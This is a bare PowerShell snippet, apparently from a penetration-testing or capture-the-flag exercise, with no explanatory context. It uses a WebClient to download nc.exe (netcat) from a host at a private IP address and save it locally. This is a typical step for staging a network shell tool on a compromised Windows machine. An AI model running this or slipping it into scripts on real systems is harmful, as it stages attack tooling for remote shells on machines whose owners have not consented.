$storageDir = $pwd 
$webclient = New-Object System.Net.WebClient 
$url = "http://192.168.121.132/nc.exe" 
$file = "nc.exe" 
$webclient.DownloadFile($url,$file) 
